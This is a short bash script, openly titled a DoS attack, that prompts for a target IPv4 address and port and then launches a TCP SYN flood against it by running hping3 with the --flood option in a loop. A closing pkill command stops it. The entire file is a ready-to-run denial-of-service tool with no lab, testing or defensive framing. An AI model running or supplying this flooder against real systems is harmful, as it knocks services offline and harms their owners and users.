#!/bin/bash

echo "This is a DoS attack"
echo "Chose your port"
read port
echo "chose your ipv4"
read ipv4

echo "Starting flood attack on $ipv4:$port . . ."
for i in {1..10}
do
	sudo hping3 -S -p "$port" --flood "$ipv4"
done

echo "Stop with ENTER"
read

echo "Stoping . . ."
sudo pkill -f "hping3 -S -p $port --flood $ipv4"

echo "Enjoy rest of your day :D"
